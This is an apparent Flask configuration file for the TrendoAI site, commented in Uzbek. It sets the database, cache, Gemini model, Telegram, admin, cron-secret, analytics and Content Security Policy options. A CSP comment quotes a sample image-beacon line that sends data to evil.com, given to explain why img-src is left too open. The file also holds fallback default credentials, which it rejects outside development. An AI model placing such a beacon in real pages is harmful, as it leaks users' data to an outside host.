# config.py
"""
TrendoAI uchun markazlashtirilgan konfiguratsiya fayli.
Barcha muhim sozlamalar shu yerda saqlanadi.
"""
import os
from dotenv import load_dotenv

load_dotenv()

# ========== MUHIT SOZLAMALARI ==========
ENV = os.getenv("FLASK_ENV", "development")
DEBUG = ENV == "development"


def _require_production_secret(env_name, value, default_value):
    if not DEBUG and (not value or value == default_value):
        raise RuntimeError(f"{env_name} production muhitida xavfsiz qiymat bilan berilishi kerak.")
    return value

# ========== SAYT SOZLAMALARI ==========
# Render da SITE_URL env o'zgaruvchisini ishlatish
# Jonli saytda www -> apex redirect bor, shuning uchun kanonik manzil www'siz
SITE_URL = os.getenv("SITE_URL", "https://trendoai.uz")

SITE_NAME = "TrendoAI"
SITE_DESCRIPTION = "TrendoAI (Trendo AI) - O'zbekistonda IT, sun'iy intellekt, Telegram botlar, Web saytlar yaratish va biznes avtomatlashtirish bo'yicha professional IT kompaniya hamda texnologiya blogi"
SITE_TAGLINE = "Trendo AI - Sun'iy intellekt, Telegram botlar va Raqamli biznes yechimlari"

# ========== MA'LUMOTLAR BAZASI ==========
DATABASE_URI = os.getenv("DATABASE_URL", "sqlite:///blog.db").strip()

# SQLAlchemy URL normalization
# - postgres://  -> postgresql://
# - mysql://     -> mysql+pymysql://
# - mysql2://    -> mysql+pymysql://
if DATABASE_URI.startswith("postgres://"):
    DATABASE_URI = DATABASE_URI.replace("postgres://", "postgresql://", 1)
elif DATABASE_URI.startswith("mysql://"):
    DATABASE_URI = DATABASE_URI.replace("mysql://", "mysql+pymysql://", 1)
elif DATABASE_URI.startswith("mysql2://"):
    DATABASE_URI = DATABASE_URI.replace("mysql2://", "mysql+pymysql://", 1)

# ========== KESH SOZLAMALARI (REDIS / IN-MEMORY) ==========
REDIS_URL = (os.getenv("REDIS_URL") or os.getenv("REDIS_TLS_URL") or "").strip()
CACHE_DEFAULT_TIMEOUT = int(os.getenv("CACHE_DEFAULT_TIMEOUT", 60))

# ========== AI SOZLAMALARI ==========
GEMINI_API_KEY = os.getenv("GEMINI_API_KEY") or os.getenv("GEMINI_API_KEY2") or os.getenv("GEMINI_API_KEY3")
_DEFAULT_MODEL = "gemini-3.7-flash"
_DEFAULT_MODEL_BACKUP = "gemini-3.5-flash-lite"
_DEFAULT_LIVE_MODEL = "gemini-3.1-flash-live-preview"

# Models that Google has retired. If someone has one of these in their
# .env / Render env vars, silently fall back to the safe default instead
# of letting every /api/chat call 404 from Gemini.
# Verified against `genai.list_models()` — entries here must actually be
# missing or "no longer available" via the live Gemini API.
_DEPRECATED_MODELS = {
    "gemini-3.1-flash-lite-preview",  # preview retired; GA "gemini-3.1-flash-lite" still works
    "gemini-pro",  # legacy v1
    "gemini-1.5-flash",  # retired
    "gemini-1.5-pro",  # retired
}


def _resolve_model(env_name, default):
    raw = (os.getenv(env_name) or "").strip()
    if not raw:
        return default
    if raw in _DEPRECATED_MODELS:
        print(f"⚠️ {env_name}={raw} is deprecated/unavailable, falling back to {default}")
        return default
    return raw


GEMINI_MODEL = _resolve_model("GEMINI_MODEL", _DEFAULT_MODEL)
GEMINI_MODEL_BACKUP = _resolve_model("GEMINI_MODEL_BACKUP", _DEFAULT_MODEL_BACKUP)
GEMINI_LIVE_MODEL = (os.getenv("GEMINI_LIVE_MODEL") or _DEFAULT_LIVE_MODEL).strip()
AI_RETRY_ATTEMPTS = 3
AI_RETRY_DELAY = 2

# ========== TELEGRAM SOZLAMALARI ==========
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHANNEL_ID = os.getenv("TELEGRAM_CHANNEL_ID")
TELEGRAM_ADMIN_ID = os.getenv("TELEGRAM_ADMIN_ID")


def _normalize_webhook_secret(raw):
    """Telegram secret_token uchun yaroqli qiymat qaytaradi.

    Telegram faqat A-Z, a-z, 0-9, _ va - belgilariga (1-256) ruxsat beradi.
    Boshqa belgi bo'lsa set_webhook xato beradi, shuning uchun bunday qiymat
    barqaror sha256 hex ko'rinishiga o'giriladi.
    """
    import hashlib
    import re as _re

    value = (raw or "").strip()
    if not value:
        return ""
    if _re.fullmatch(r"[A-Za-z0-9_-]{1,256}", value):
        return value
    return hashlib.sha256(value.encode("utf-8")).hexdigest()
TELEGRAM_MAX_MESSAGE_LENGTH = 4096
TELEGRAM_RETRY_ATTEMPTS = 3

# ========== ADMIN SOZLAMALARI ==========
DEFAULT_ADMIN_USERNAME = "admin"
DEFAULT_ADMIN_PASSWORD = "trendoai2025"
DEFAULT_SECRET_KEY = "trendoai-secret-key-change-in-production"
ADMIN_USERNAME = os.getenv("ADMIN_USERNAME", DEFAULT_ADMIN_USERNAME)

# ADMIN_PASSWORD_HASH berilgan bo'lsa, ochiq parol umuman saqlanmaydi.
# Hash yaratish: python scripts/generate_admin_hash.py
ADMIN_PASSWORD_HASH = (os.getenv("ADMIN_PASSWORD_HASH") or "").strip()

if ADMIN_PASSWORD_HASH:
    # Hash rejimida ochiq ADMIN_PASSWORD talab qilinmaydi.
    ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "")
else:
    ADMIN_PASSWORD = _require_production_secret(
        "ADMIN_PASSWORD",
        os.getenv("ADMIN_PASSWORD", DEFAULT_ADMIN_PASSWORD),
        DEFAULT_ADMIN_PASSWORD,
    )
    if not DEBUG:
        print(
            "OGOHLANTIRISH: ADMIN_PASSWORD ochiq matnda saqlanmoqda. "
            "ADMIN_PASSWORD_HASH ga o'tish tavsiya etiladi "
            "(python scripts/generate_admin_hash.py)."
        )
SECRET_KEY = _require_production_secret(
    "SECRET_KEY",
    os.getenv("SECRET_KEY", DEFAULT_SECRET_KEY),
    DEFAULT_SECRET_KEY,
)

# ========== PUSH NOTIFICATION SOZLAMALARI ==========
# Maxfiy kalit hech qachon kodga yozilmaydi — faqat muhit o'zgaruvchisidan olinadi.
# Yangi juftlik yaratish: python scripts/generate_vapid.py
VAPID_PUBLIC_KEY = os.getenv("VAPID_PUBLIC_KEY", "")
VAPID_PRIVATE_KEY = os.getenv("VAPID_PRIVATE_KEY", "")
VAPID_CLAIMS_SUB = "mailto:admin@trendoai.uz"

# ========== SCHEDULER SOZLAMALARI ==========
TIMEZONE = "Asia/Tashkent"
SEO_POST_HOUR = 9
SEO_POST_MINUTE = 0

# ========== CRON SOZLAMALARI ==========
# Tashqi cron xizmatlari uchun secret key
DEFAULT_CRON_SECRET = "trendoai-cron-secret-2025"
CRON_SECRET = _require_production_secret(
    "CRON_SECRET",
    os.getenv("CRON_SECRET", DEFAULT_CRON_SECRET),
    DEFAULT_CRON_SECRET,
)

# ========== TELEGRAM WEBHOOK SIRI ==========
# Cron endpointlari va Telegram webhook ikki xil ishonch chegarasi — bitta sir
# ikkalasini himoya qilmasligi kerak. TELEGRAM_WEBHOOK_SECRET berilmasa,
# deploy buzilmasligi uchun CRON_SECRET ga qaytiladi va ogohlantirish yoziladi.
_RAW_TELEGRAM_WEBHOOK_SECRET = os.getenv("TELEGRAM_WEBHOOK_SECRET")
if not _RAW_TELEGRAM_WEBHOOK_SECRET:
    if not DEBUG:
        print(
            "OGOHLANTIRISH: TELEGRAM_WEBHOOK_SECRET berilmagan, CRON_SECRET ishlatilmoqda. "
            "Ikkala sirni ajratish uchun Render'da alohida qiymat qo'ying."
        )
    _RAW_TELEGRAM_WEBHOOK_SECRET = CRON_SECRET

TELEGRAM_WEBHOOK_SECRET = _normalize_webhook_secret(_RAW_TELEGRAM_WEBHOOK_SECRET)

# ========== ANALYTICS & REMARKETING ==========
# Google Analytics 4 (G-XXXXXXXXXX formatida)
GA4_ID = os.getenv("GA4_ID")
# Google Ads Remarketing (AW-XXXXXXXXXX formatida)
GOOGLE_ADS_ID = os.getenv("GOOGLE_ADS_ID")
# Facebook Pixel ID (faqat raqamlar)
FACEBOOK_PIXEL_ID = os.getenv("FACEBOOK_PIXEL_ID", "1192818429057379")
# Meta Conversions API Access Token (Faqat xavfsiz muhit o'zgaruvchisi orqali)
FB_CONVERSIONS_API_TOKEN = os.getenv("FB_CONVERSIONS_API_TOKEN")
# Meta ilova siri — lead webhook imzosini (X-Hub-Signature-256) tekshirish uchun.
# Berilmasa, webhook imzosiz qabul qilinadi (eski xulq) va ogohlantirish chiqadi.
FB_APP_SECRET = os.getenv("FB_APP_SECRET")

# ========== CONTENT SECURITY POLICY ==========
# Bosqich 1: tashqi manbalar qat'iy ro'yxatlanadi, lekin 'unsafe-inline'
# saqlanadi — shablonlarda 139 ta inline event handler (onclick= va h.k.)
# bor va ularni nonce qamrab olmaydi. Bosqich 2 da handlerlar
# addEventListener ga ko'chiriladi va nonce joriy qilinadi.
_CSP_DIRECTIVES = [
    "default-src 'self'",
    (
        "script-src 'self' 'unsafe-inline' "
        "https://www.googletagmanager.com https://www.google-analytics.com "
        "https://connect.facebook.net https://telegram.org"
    ),
    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdnjs.cloudflare.com",
    "font-src 'self' https://fonts.gstatic.com https://cdnjs.cloudflare.com",
    # Post va portfolio rasmlari bazadan keladi va admin istalgan domen
    # kiritishi mumkin, shuning uchun hozircha barcha HTTPS manbalar ochiq.
    # S3/R2 yoqilgach bu qator qat'iy ro'yxatga almashtirilsin — aks holda
    # `new Image().src = 'https://evil.com/?d=' + data` eksfiltratsiya kanali ochiq qoladi.
    "img-src 'self' data: blob: https:",
    (
        "connect-src 'self' "
        "https://www.google-analytics.com https://region1.google-analytics.com "
        "https://analytics.google.com https://stats.g.doubleclick.net "
        "https://www.facebook.com"
    ),
    "frame-src 'self' https://www.youtube.com",
    "media-src 'self' https:",
    "worker-src 'self'",
    "manifest-src 'self'",
    "object-src 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "frame-ancestors 'self'",
]

CSP_POLICY = "; ".join(_CSP_DIRECTIVES + ["upgrade-insecure-requests"])

# upgrade-insecure-requests report-only rejimda brauzer tomonidan e'tiborsiz
# qoldiriladi va konsolga ogohlantirish yozadi — shuning uchun tashlab ketiladi.
CSP_REPORT_ONLY_POLICY = "; ".join(_CSP_DIRECTIVES)

# Allaqachon jonli ishlayotgan va hech narsani buzmasligi tasdiqlangan minimal to'plam.
CSP_BASELINE_POLICY = (
    "object-src 'none'; base-uri 'self'; frame-ancestors 'self'; "
    "form-action 'self'; upgrade-insecure-requests"
)

# Yangi siyosat avval kuzatuv rejimida ishlaydi. Konsolda buzilish
# ko'rinmasa, CSP_ENFORCE=true qo'yib majburiy rejimga o'tkaziladi.
CSP_ENFORCE = (os.getenv("CSP_ENFORCE", "false") or "").strip().lower() in ("1", "true", "yes", "on")

# ========== PAGINATION ==========
POSTS_PER_PAGE = 10

# ========== KATEGORIYALAR ==========
CATEGORIES = [
    "Web Saytlar",
    "Telegram Botlar", 
    "AI Chatbotlar",
    "Avtomatlashtirish",
    "Case Studies",
    "Texnik Yo'riqnomalar"
]
